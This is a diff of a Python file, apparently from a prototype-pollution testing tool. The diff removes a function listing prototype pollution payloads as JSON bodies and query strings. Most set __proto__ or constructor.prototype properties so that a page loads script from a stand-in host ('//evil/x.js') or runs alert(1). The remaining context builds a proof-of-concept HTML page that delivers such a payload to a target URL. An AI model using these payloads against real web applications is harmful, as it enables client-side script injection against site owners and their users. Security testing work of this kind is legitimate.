@@ -212,26 +212,6 @@ def analyze_page(html: str) -> dict:
         "sinks": sinks,
         "pollution_payloads": payloads,
     }
-
-
-def build_pollution_payloads() -> list[str]:
-    """High-yield prototype pollution payloads."""
-    return [
-        # JSON body pollution (POST)
-        '{"__proto__": {"src": "//evil/x.js"}}',
-        '{"__proto__": {"onload": "alert(1)"}}',
-        '{"__proto__": {"html": "<img src=x onerror=alert(1)>"}}',
-        '{"__proto__": {"toString": "alert(1)"}}',
-        # Query-param pollution (GET) -- depends on parser
-        '__proto__[src]=//evil/x.js',
-        '__proto__[onload]=alert(1)',
-        '__proto__[html]=<img src=x onerror=alert(1)>',
-        # constructor.prototype path
-        'constructor[prototype][src]=//evil/x.js',
-        'constructor[prototype][onload]=alert(1)',
-    ]
-
-
 def build_poc_html(target_url: str, payload: str = '__proto__[src]=//evil/x.js') -> str:
     """Build a PoC HTML that delivers a prototype pollution payload."""
     sep = "&" if "?" in target_url else "?"
